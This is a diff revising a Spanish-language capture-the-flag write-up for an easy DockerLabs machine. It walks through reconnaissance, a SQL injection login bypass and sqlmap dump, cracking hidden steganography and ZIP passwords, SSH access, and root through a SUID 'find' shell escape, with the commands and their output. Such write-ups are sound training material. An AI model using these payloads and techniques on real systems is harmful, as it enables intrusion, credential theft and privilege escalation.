@@ -2,15 +2,16 @@ Propiedades:
 - OS: Linux
 - Plataforma: DockerLabs
 - Nivel: Easy
-- Tags: #sqli #password-cracking #esteganografia #dockerlabs
+- Tags: #sqli #sqlmap #steganography #password-cracking #suid-abuse
 
 ![](assets/Pasted%20image%2020251109234535.png)
+
 ## Reconocimiento
 
-Comenzamos tirando un ping para comprobar conectividad:
+Comienzo tirando un ping para comprobar la conectividad.
+
 ```bash
 > ping -c 1 172.17.0.2
-
 PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
 64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=1.43 ms
 
@@ -19,9 +20,10 @@ PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
 rtt min/avg/max/mdev = 1.426/1.426/1.426/0.000 ms
 ```
 
-- El ttl indica que estamos ante un linux
+- El TTL de 64 indica que estamos ante una máquina Linux.
 
-Ahora procedemos a hacer un escaneo con nmap para ver que puertos están abiertos.
+Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.
+
 ```bash
 > nmap -p- --open --min-rate 5000 -Pn -n 172.17.0.2
 ----------------------------------------------------
@@ -31,9 +33,10 @@ PORT   STATE SERVICE
 MAC Address: DA:B4:F0:8E:E7:3E (Unknown)
 ```
 
-- Vemos el puerto 80 HTTP y 22 SSH abiertos.
+- Puertos 22 y 80 abiertos.
 
-Ahora procedemos a hacer un segundo escaneo mas profundo sobre los puertos abiertos para detectar versiones y servicios que estan corriendo.
+Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.
+
 ```bash
 > nmap -p 22,80 -sS -Pn -n --min-rate 5000 -sCV 172.17.0.2 -oN target.txt
 -------------------------------------------------------------------------
@@ -49,30 +52,22 @@ MAC Address: DA:B4:F0:8E:E7:3E (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-- Puerto 22 SSH: OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
-- Puerto 80 HTTP: Apache httpd 2.4.61 ((Debian))
+- Puerto 22 SSH OpenSSH 9.2p1 Debian 2+deb12u3
+- Puerto 80 HTTP Apache httpd 2.4.61 (Debian)
 
 ## Enumeración
 
-**Puerto 80 HTTP**
+### Puerto 80 HTTP
 
-- Al parecer es un simple login
+La página principal muestra un formulario de login simple.
+
 ![](assets/Pasted%20image%2020251109194933.png)
 
-Viendo el codigo fuente noto que existe un script llamado `auth.php` que supongo que controla el login.
-```php
- <form action="auth.php" method="post">
-            <label for="username">Usuario:</label>
-            <input type="text" id="username" name="username" required>
-            
-            <label for="password">Contraseña:</label>
-            <input type="password" id="password" name="password" required>
-            
-            <input type="submit" value="Entrar">
-  </form>
-```
 
-Ahora procedo a realizar Fuzzing para tener mas en claro todos los recursos de la web:
+**Fuzzing de Directorios.**
+
+Utilizo `gobuster` para descubrir posibles recursos en el servidor web.
+
 ```bash
 > gobuster dir -w raft-large-directories.txt -u http://172.17.0.2/ -x html,php,py,js,txt
 ===============================================================
@@ -85,25 +80,30 @@ Starting gobuster in directory enumeration mode
 /index.php            (Status: 200) [Size: 2351]
 ```
 
-- _index.php_ hace referencia al login
-- _auth.php_ es el script que controla el login
+- `index.php`: Formulario de login
+- `auth.php`: Script que procesa la autenticación
+- `page.php`: Página posterior al login
 
-Por ultimo el _page.php_.
+Accedo a `page.php` directamente y encuentro una funcionalidad para consultar la temperatura.
 
-- Al parecer simplemente sirve para consultar la temperatura
 ![](assets/Pasted%20image%2020251109195426.png)
-
 
 ## Explotación
 
-El Formulario de Login, puede ser bypasseado con un simple SQLi 
+### SQL Injection
+
+El formulario de login es vulnerable a **SQL Injection**. Puedo bypassear la autenticación con un payload simple.
+
 ```sql
 1' or 1=1-- -
 ```
 
-- Al bypassear el login, nos lleva a _page.php_
+Al bypassear el login, soy redirigido a `page.php`.
 
-Sabiendo que el formulario era vulnerable a SQLi lo primero que hice fue comprobarlo con sqlmap:
+### Explotación con SQLMap
+
+Confirmo la vulnerabilidad utilizando `sqlmap`.
+
 ```bash
 > sqlmap -u "http://172.17.0.2/index.php" --forms --batch
 -----------------------------------------------------------
@@ -121,9 +121,10 @@ Parameter: username (POST)
     Payload: username=NVJA' AND (SELECT 5085 FROM (SELECT(SLEEP(5)))loap)-- USWr&password=ouXU
 ```
 
-- vulnerable a una sqli error-based
+- La aplicación es vulnerable a SQLi error-based.
 
-Ahora procedí a listar las bases de datos:
+Listo las bases de datos disponibles.
+
 ```bash
 > sqlmap -u "http://172.17.0.2/index.php" --forms --dbs --batch
 -----------------------------------------------------------------
@@ -131,9 +132,10 @@ Ahora procedí a listar las bases de datos:
 [*] users
 ```
 
-- Lo que nos interesa es la base de datos _users_
+- La base de datos `users` es de interés.
 
-Procedo a listar sus tablas:
+Listo las tablas de la base de datos `users`.
+
 ```bash
 > sqlmap -u "http://172.17.0.2/index.php" --forms -D users --tables --batch
 ----------------------------------------------------------------------------
@@ -144,7 +146,8 @@ Database: users
 +----------+
 ```
 
-Y ahora sabiendo que existe una tabla llamado usuarios procedo a dumpear el contenido
+Dumpeo el contenido de la tabla `usuarios`.
+
 ```bash
 > sqlmap -u "http://172.17.0.2/index.php" --forms -D users -T usuarios --dump --batch
 Table: usuarios
@@ -159,24 +162,19 @@ Table: usuarios
 +----+------------------------+------------+
 ```
 
-Puede que alguna de estas credenciales nos sirva para conectarnos por SSH, por lo cual trate de conectarme con cada uno de ellos pero no tuve éxito.
+### Descubrimiento de Directorio Oculto
 
-En las credenciales obtenidas me di cuenta que había un password llamada directoriotravieso, por lo cual me decidí a ver si en verdad era un directorio.
-
-- Al parecer si era un directorio que aloja una imagen llamada _miramebien.jpg_
+Uno de los passwords encontrados es `directoriotravieso`, lo cual sugiere que podría ser un directorio. Accedo a `http://172.17.0.2/directoriotravieso/`.
 
 ![](assets/Pasted%20image%2020251109202221.png)
 
-Ahora que tengo una imagen, se me ocurrían 2 cosas:
-- Metadatos - Al analizar por metadatos con exiftool, no encontré nada relevante.
-- Esteganografía
+- Encuentro una imagen llamada `miramebien.jpg`
 
-Ya que la primer opción no dio resultados me dio por intentar la segunda opción. Lo primero que intente fue ver si no requería de contraseña o si la contraseña era alguna de las contraseñas que había en mysql pero no tuve éxito.
-```bash
-> steghide --extract -sf miramebien.jpg
-```
+### Esteganografía
 
-Por lo cual decidí crackear la contraseña con `stegseek`
+Descargo la imagen y analizo sus metadatos con `exiftool`, pero no encuentro nada relevante. Decido probar **esteganografía**.
+
+Intento extraer datos ocultos con `steghide` usando las contraseñas encontradas, pero sin éxito. Decido crackear la contraseña con `stegseek`.
 
 ```bash
 > stegseek miramebien.jpg /usr/share/wordlists/rockyou.txt
@@ -188,32 +186,42 @@ StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 [i] Extracting to "miramebien.jpg.out".
 ```
 
-- Crackeamos la contraseña con exito y me extrajo un archivo llamado miramebien.jpg.out que renombre a _ocultito.zip_
+- Contraseña encontrada: `chocolate`
+- Archivo extraído: `ocultito.zip`
 
-Liste el contenido del zip:
+Listo el contenido del archivo ZIP.
+
 ```bash
 > unzip -l ocultito.zip
 Archive:  ocultito.zip
 16  2024-08-10 13:43   secret.txt
 ```
 
-Trate de extraer el zip pero me pedía contraseña por lo cual procedí a crackearla.
+Intento extraer el ZIP pero requiere contraseña. Utilizo `fcrackzip` para crackearla.
+
 ```bash
 > fcrackzip -u ocultito.zip -D -p /usr/share/wordlists/rockyou.txt
 PASSWORD FOUND!!!!: pw == stupid1
 ```
 
-Ahora que ya tengo la contraseña puedo extraer el zip y ver el contenido del _secret.txt_
+Extraigo el contenido del ZIP y leo `secret.txt`.
+
 ```bash
 > cat secret.txt
 carlos:carlitos
 ```
 
-- Posibles credenciales SSH.
+- Credenciales SSH: `carlos:carlitos`
 
-Intento conectarme mediante SSH con esas credenciales y tengo éxito:
+### Acceso SSH
+
+Me conecto por SSH con las credenciales encontradas.
+
 ```bash
 > ssh carlos@172.17.0.2
+carlos@172.17.0.2's password: carlitos
+Welcome to Debian GNU/Linux 12 (bookworm)
+
 carlos@9533d1fb3eb7:~$ whoami
 carlos
 carlos@9533d1fb3eb7:~$ id                                                                                                                                        
@@ -222,17 +230,18 @@ uid=1000(carlos) gid=1000(carlos) groups=1000(carlos),100(users)
 
 ## Escalada de Privilegios
 
+Dentro del sistema enumero binarios que pueda ejecutar con privilegios elevados.
 
-Lo primero que hago dentro del sistema es ver que binarios puedo ejecutar como root o algún otro usuarios:
 ```bash
 > sudo -l
+[sudo] password for carlos:
 ```
 
-- Pero no tengo éxito ya que no tengo permisos
+- No tengo permisos sudo sin contraseña.
 
-Mi segundo approach fue buscar binarios con permisos SUID
+### Búsqueda de Binarios SUID
 
-- Aquí es donde encuentro el binario _find_ que me va a servir para escalar privilegios.
+Busco binarios con el bit SUID activado.
 
 ```bash
 > carlos@9533d1fb3eb7:~$ find / -perm -4000 2>/dev/null 
@@ -240,7 +249,9 @@ Mi segundo approach fue buscar binarios con permisos SUID
 /usr/bin/find
 ```
 
-Con ayuda de GTFObins exploto el binario _find_
+- El binario `find` tiene SUID y pertenece a root.
+
+Consulto [GTFOBins](https://gtfobins.github.io/gtfobins/find/) para encontrar formas de abusar de `find` con SUID.
 
 ```bash
 > carlos@9533d1fb3eb7:~$ /usr/bin/find . -exec /bin/sh -p \; -quit              
@@ -250,4 +261,8 @@ root
 uid=1000(carlos) gid=1000(carlos) euid=0(root) groups=1000(carlos),100(users)
 ```
 
-***PWNED**
+El output muestra:
+- `uid=1000(carlos)`: Identidad real del usuario
+- `euid=0(root)`: Privilegios efectivos de root
+
+***PWNED***
